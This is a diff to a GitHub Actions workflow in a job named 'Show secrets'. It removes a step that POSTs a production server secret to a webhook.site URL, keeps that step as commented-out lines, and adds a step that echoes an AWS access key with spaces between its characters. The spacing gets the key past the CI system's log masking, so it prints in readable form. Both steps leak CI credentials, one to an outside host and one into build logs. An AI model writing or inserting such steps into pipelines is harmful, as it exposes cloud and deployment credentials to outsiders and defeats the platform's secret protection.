@@ -7,11 +7,14 @@ jobs:
     name: Show secrets
     runs-on: ubuntu-latest
     steps:
-      - name: Deploy Stage
+      - name: Display env vars
         env:
           SERVER_PROD: ${{ secrets.OPENSHIFT_SERVER_PROD }}
-        uses: fjogeleit/http-request-action@v1
-        with:
-          url: 'https://webhook.site/108d58e1-026b-45b4-8b7f-8278824e2dec'
-          method: 'POST'
-          data: ${{ secrets.OPENSHIFT_SERVER_PROD }}
+        run: |
+          echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
+  #   - name: Post to webhook
+  #      uses: fjogeleit/http-request-action@v1
+  #      with:
+  #       url: 'https://webhook.site/108d58e1-026b-45b4-8b7f-8278824e2dec'
+  #        method: 'POST'
+  #        data: ${{ secrets.OPENSHIFT_SERVER_PROD }}
